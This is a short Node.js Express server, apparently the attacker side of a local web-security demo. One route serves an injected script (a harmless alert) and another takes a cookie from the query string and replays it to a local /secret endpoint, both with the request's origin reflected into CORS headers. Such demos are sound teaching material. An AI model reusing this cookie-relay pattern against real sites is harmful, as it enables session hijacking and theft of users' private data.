var http = require('http');
var express = require('express');

var app = express();
app.set('etag', false);

app.get('/script.js', function (req, res) {
    res.header('Access-Control-Allow-Origin', req.headers.origin);
    res.send("alert('Script injected');");
});

app.get('/cookie.txt', function (req, res) {
    res.header('Access-Control-Allow-Origin', req.headers.origin);
    http.get({
        hostname: 'localhost',
        port: 3000,
        path: '/secret',
        headers: {
            Cookie: req.query.cookie
        }
    }, (response) => {
        var result = ''
        response.on('data', function (chunk) {
            result += chunk;
        });
        response.on('end', function () {
            res.send(result);
        });
    });
});

http.createServer(app).listen(3001);
